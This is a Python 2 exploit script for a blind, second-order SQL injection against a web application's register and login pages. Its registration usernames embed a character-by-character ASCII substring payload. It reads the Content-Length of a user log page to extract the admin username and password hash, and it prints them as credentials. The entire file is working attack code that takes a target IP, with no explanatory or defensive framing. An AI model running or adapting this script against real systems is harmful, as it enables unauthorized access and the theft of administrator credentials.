import requests
import sys
import  hashlib
import urllib

proxies = {'http':'127.0.0.1:8080', 'http':'127.0.0.1:8080'} 

def sha1(password):
	m= hashlib.sha1()
	m.update(password)
	return m.hexdigest()
 
 
def gen_hash(password, token):
	m= hashlib.sha1()
	m.update(password + token)
	return m.hexdigest()
	


def register(ip,inj_str):
	for j in range(32, 126):
		# Getting registered
		target = "http://%s//register.php" % (ip) 
		password = 'password'
		passhashed = sha1(password)
		username = '%s' % (inj_str.replace("[CHAR]", str(j)))
		
		data = {
			"form_password_hidden" : passhashed,
			"username" : username,
			"password" : "",
			"register" : 'submit'	
		}
		
		r = requests.post(target, data=data, allow_redirects=True)
		res = r.text
		#if 'Registered' in res or 'registered' in res:
	
	return True
		
	
	
		# Logging in
def login(ip, inj_str):
	
	for j in range(32, 126):
		target = "http://%s//login.php" % (ip)
		token = 'token'
		password = 'password'
		passhashed = sha1(password)
		hashed = gen_hash(passhashed, token)
		username = '%s' % (inj_str.replace("[CHAR]", str(j)))
			
		data = {
			"form_password_hidden" : hashed,
			"username": username,
			"password" : "",
			"submit" : 'submit',
			"token" : 'token'
		}
		s  = requests.Session()
		r = s.post(target, data=data, proxies=proxies)
		res = r.text
		status_code = r.status_code
		
		if 'welcome'in res or 'Welcome' in res:
			
			# open log files
			target = "http://%s/user_log.php" % (ip)
			r = s.get(target, proxies=proxies)
			content_length = int(r.headers['Content-Length'])
			
			if (content_length > 750):
				return j


		
	return False

def inject(r, inj, ip):
	extracted = ""
	for k in range(1, r):
		
		injection_string = "'or (ascii(substring(((%s)),%s,1)))=[CHAR]#" % (inj, k)
		register(ip,injection_string)
		retrieved_value = login(ip, injection_string)
		if(retrieved_value):
			extracted += chr(retrieved_value)
			extracted_char = chr(retrieved_value)
			sys.stdout.write(extracted_char)
			sys.stdout.flush()
		else:
			print "\n(+) done!"
			break
	return extracted


def main():
    if len(sys.argv) != 2:
        print "(+) usage: %s <target>" % sys.argv[0]
        print '(+) eg: %s 192.168.1.100' %sys.argv[0]
    	sys.exit(-1)

    ip = sys.argv[1]
    
    print "(+) logging in"
    print "(+) Retrieving username...."
    query = "select username from admin where id=1"
    username = inject(40, query, ip)
    print "(+) Retrieving Password hash...."
    query = 'select password from admin where username = \'%s\' limit 1' % (username)
    password = inject(50, query, ip)
    print "(+) Credentials: %s / %s" % (username, password)

if __name__ == "__main__":
    main()
